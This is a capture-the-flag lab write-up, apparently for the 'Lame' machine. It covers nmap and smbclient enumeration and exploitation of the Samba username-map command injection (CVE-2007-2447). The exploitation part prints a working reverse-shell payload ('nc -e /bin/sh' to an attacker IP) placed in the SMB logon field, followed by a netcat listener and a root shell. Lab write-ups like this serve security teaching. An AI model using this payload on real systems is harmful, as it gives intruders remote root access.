## Enumeration
Lets start with doing a network scan of the IP address to identify the open ports and the services running on the ports (NOTE: This might take up quite some time)
* sV : service detection
* sC : run default nmap scripts
* O : identify OS running on each port
* -p- : Scan all ports
```code
sudo nmap -sV -sC -A -p- 10.10.10.3 -vv  
```
From the output of ```nmap```, we are able to know the following information about the ports: 
| Port Number | Service | Version |
|-----|------------------|----------------------|
| 21	| FTP | vsftpd 2.3.4 |
| 22	| SSH | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) |
| 139	| netbios-ssn | Samba smbd 3.X - 4.X |
| 445	| netbios-ssn | Samba smbd 3.0.20-Debian |
| 3632	| distccd | distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) |

## Exploitation
### VSFTPD
From the results of ```searchsploit```, we know that ```vsftpd 2.3.4``` is vulnerable to backdoor command execution
```code
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remot | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote D | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote D | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service           | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/17491.rb
vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/49757.py
vsftpd 3.0.3 - Remote Denial of Service    | multiple/remote/49719.py
------------------------------------------- ---------------------------------
```
We will then scan for the vulnerability using ```nmap```
```code
sudo nmap --script ftp-vsftpd-backdoor.nse -p 21 10.10.10.3
```
However, the output shows that the port is not vulnerable to such a vulnerability.
### OpenSSH
The results from ```searchsploit``` of ```OpenSSH``` shows nothing promising, so we will be skipping this

## Samba
Samba is an implementation for SMB networking protocol. We will now try to connect to SMB server using ```smbclient```, and we realise that we can do an anonymous login to the SMB server.
```code
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.10.3 --option='client min protocol=NT1'
Enter WORKGROUP\kali's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```
Knowing that we are able to login to the SMB server without any credentials, we will start to look for possible exploits, keeping in mind that ```Samba``` is used.\
Looking through ```exploitdb```, we discovered CVE 2007-2447 that allows remote attackers to run commands via the username parameter in Samba.\
To exploit CVE 2007-2447, we will first have to create a listener on the attacker machine
```code
nc -nlvp 3000
```
All we have to do on the victim's machine is to connect to the SMB client and send shell metacharacters into the username with a reverse shell payload.
```code
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.10.3/tmp                                           1 ⚙
Enter WORKGROUP\kali's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.16.250 3000`"
Password: 
session setup failed: NT_STATUS_IO_TIMEOUT
smb: \> 
```
Afterwards, a connection is received on the attacker's machine and we can obtain the flag
```code
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 3000              
listening on [any] 3000 ...
connect to [10.10.16.250] from (UNKNOWN) [10.10.10.3] 49928
python -c 'import pty; pty.spawn("bash")'
root@lame:/# cd /root
cd /root
root@lame:/root# ls
ls
Desktop  reset_logs.sh  root.txt  vnc.log
root@lame:/root# cat root.txt
cat root.txt
```
